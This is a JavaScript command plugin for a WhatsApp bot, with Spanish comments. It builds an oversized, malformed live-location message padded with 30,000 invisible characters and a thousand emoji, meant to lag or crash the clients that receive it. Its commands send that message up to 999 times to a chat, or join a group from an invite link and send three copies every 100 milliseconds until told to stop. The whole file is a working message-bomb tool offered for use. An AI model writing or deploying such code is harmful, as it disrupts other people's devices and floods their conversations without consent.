const buildLagMessage = () => ({
  viewOnceMessage: {
    message: {
      liveLocationMessage: {
        degreesLatitude: '💣',
        degreesLongitude: '💥',
        caption: '\u2063'.repeat(30000) + '💥'.repeat(1000),
        sequenceNumber: '999',
        jpegThumbnail: null,
        contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          externalAdReply: {
            title: '💣 Lag WhatsApp',
            body: 'Este mensaje es muy pesado',
            mediaType: 1,
            renderLargerThumbnail: true,
            showAdAttribution: true,
            sourceUrl: 'https://wa.me/0'
          }
        }
      }
    }
  }
})

let activeBombing = false
let bombingInterval = null

let handler = async (m, { conn, isOwner }) => {
  if (!isOwner) return

  const text = m.text?.trim()

  // Comando clásico ¤-n
  const matchClassic = text.match(/^¤(?:-(\d{1,3}))?$/)
  if (matchClassic) {
    const repeatCount = parseInt(matchClassic[1]) || 1
    if (repeatCount < 1 || repeatCount >= 1000) return

    for (let i = 0; i < repeatCount; i++) {
      try {
        await conn.relayMessage(m.chat, buildLagMessage(), { messageId: conn.generateMessageTag() })
        await new Promise(resolve => setTimeout(resolve, 100))
      } catch (error) {
        console.error('Error al enviar mensaje:', error)
      }
    }
    return
  }

  // Comando Ω <link>
  const matchJoin = text.match(/^Ω\s+(https:\/\/chat\.whatsapp\.com\/[A-Za-z0-9]+)$/i)
  if (matchJoin) {
    const inviteLink = matchJoin[1]
    try {
      const groupCode = inviteLink.split('/')[3]
      const groupId = await conn.groupAcceptInvite(groupCode)
      activeBombing = true

      bombingInterval = setInterval(async () => {
        if (!activeBombing) return
        try {
          for (let i = 0; i < 3; i++) {
            await conn.relayMessage(groupId, buildLagMessage(), { messageId: conn.generateMessageTag() })
          }
        } catch (err) {
          console.error('Error en bombardeo:', err)
        }
      }, 100)

      await m.reply(`💣 Entré al grupo y comencé el bombardeo cada 100ms con triple impacto.`)
    } catch (err) {
      await m.reply(`❌ Error al entrar al grupo: ${err}`)
    }
    return
  }

  // Comando Ω end
  if (/^Ω\s+end$/i.test(text)) {
    activeBombing = false
    if (bombingInterval) clearInterval(bombingInterval)
    await m.reply('🛑 Bombardeo detenido.')
    return
  }
}

handler.command = new RegExp
handler.customPrefix = /^¤(?:-\d{1,3})?$|^Ω\s+(https:\/\/chat\.whatsapp\.com\/[A-Za-z0-9]+)$|^Ω\s+end$/i
handler.tags = ['owner']
handler.help = ['¤-n', 'Ω <link>', 'θ']

export default handler